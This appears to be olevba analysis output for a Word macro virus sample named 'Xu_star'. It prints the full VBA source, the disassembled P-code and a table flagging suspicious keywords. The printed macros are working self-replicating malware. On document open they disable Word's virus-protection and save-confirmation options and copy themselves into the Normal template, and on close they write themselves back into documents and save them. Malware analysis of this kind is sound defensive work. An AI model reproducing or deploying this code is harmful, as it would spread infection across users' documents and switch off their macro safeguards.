olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xu
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xu - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Xu_star macro Virus  1.00
Private Sub Document_Close()
On Error Resume Next
Dim ADL As Long, NTL As Long
Dim FileNM As String
FileNM = System.Application.Path & "\" & Right(Year(Date), 2) & Month(Date) & Day(Date) & Second(Time) & ".dos"
Dim FNo As Long
ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "'Xu_star macro Virus  1.00" Then
FNo = FreeFile
Open FileNM For Output As #FNo
Print #FNo, "Xu_star 1.00a Welcome!"
Close #FNo
Exit Sub
End If

If ADL > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount

NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ActiveDocument.Saved = True Then
   ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines NTL, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NTL)
   Call ActiveDocument.Save
   ActiveDocument.Saved = True
End If
End Sub


Private Sub Document_Open()
On Error Resume Next
Dim ADL As Long, NTL As Long

Options.VirusProtection = (100 * 0)
Options.ConfirmConversions = (100 * 0)
Options.SaveNormalPrompt = (100 * 0)

ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

'if Normal not Xu_star virus
'Infect to normalTemplate
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Xu_star macro Virus  1.00" Then
   If NTL > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount
   ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines ADL, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ADL)
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Xu
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3714 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0019 "Xu_star macro Virus  1.00"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn ADL (As Long)
' 	VarDefn NTL (As Long)
' Line #4:
' 	Dim 
' 	VarDefn FileNM (As String)
' Line #5:
' 	Ld System 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	Ld Time 
' 	ArgsLd Second 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".dos"
' 	Concat 
' 	St FileNM 
' Line #6:
' 	Dim 
' 	VarDefn FNo (As Long)
' Line #7:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADL 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTL 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001A "'Xu_star macro Virus  1.00"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	Ld Friend 
' 	St FNo 
' Line #12:
' 	Ld FileNM 
' 	Ld FNo 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #13:
' 	Ld FNo 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Xu_star 1.00a Welcome!"
' 	PrintItemNL 
' Line #14:
' 	Ld FNo 
' 	Sharp 
' 	Close 0x0001 
' Line #15:
' 	ExitSub 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Ld ADL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LinesCount 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #19:
' Line #20:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTL 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld NTL 
' 	LitDI2 0x0001 
' 	Ld NTL 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	Ld ActiveDocument 
' 	ArgsMemCall (Call) Save 0x0000 
' Line #24:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub Document_Open())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	Dim 
' 	VarDefn ADL (As Long)
' 	VarDefn NTL (As Long)
' Line #32:
' Line #33:
' 	LitDI2 0x0064 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #34:
' 	LitDI2 0x0064 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #35:
' 	LitDI2 0x0064 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #36:
' Line #37:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADL 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTL 
' Line #39:
' Line #40:
' 	QuoteRem 0x0000 0x001B "if Normal not Xu_star virus"
' Line #41:
' 	QuoteRem 0x0000 0x0018 "Infect to normalTemplate"
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001A "'Xu_star macro Virus  1.00"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	Ld NTL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LinesCount 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADL 
' Line #45:
' 	Ld ADL 
' 	LitDI2 0x0001 
' 	Ld ADL 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

